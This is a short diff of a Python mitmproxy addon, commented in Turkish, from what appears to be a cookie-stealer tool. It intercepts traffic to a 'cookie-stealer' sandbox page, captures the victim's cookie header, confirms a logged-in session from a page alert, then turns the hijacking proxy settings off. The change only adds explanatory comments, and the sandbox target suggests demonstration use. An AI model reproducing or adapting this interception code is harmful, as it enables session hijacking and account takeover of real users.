@@ -93,14 +93,14 @@ if START_PROXY_WHEN_OPENING:
 # SECTION Yazılım ana kod parçacığı.
 class RequestLogger:
     async def response(self, flow: http.HTTPFlow):
-        if str(flow.request.url).startswith("https://sandbox.oniyevski.com/cookie-stealer"):
+        if str(flow.request.url).startswith("https://sandbox.oniyevski.com/cookie-stealer"): # Buradaki bağlantı, 103. satırdaki divin yakalanacağı sayfaynın olduğu bağlantıdır.
             get_cookies = flow.request.headers.get("cookie", None)
             if get_cookies is not None:
                 get_cookies = get_cookies.replace(", ", "; ")
                 original_content = flow.response.get_text()
                 soup = BeautifulSoup(original_content, 'html.parser')
                 soup = str(soup)
-                login_check = parse_html(soup, '<div class="alert alert-success">', '</div>') # Ben sandbox içerisindeki 
+                login_check = parse_html(soup, '<div class="alert alert-success">', '</div>') # Ben sandbox içerisindeki alert divinden kullanıcının siteye giriş yapıp yapmadığını kontrol etmek için, div üzerinden bir yakalama gerçekleştirdim.
                 if login_check == "Session ve cookie verileri ile giriş yaptınız.":
                     disable_proxy_settings()
                     try:
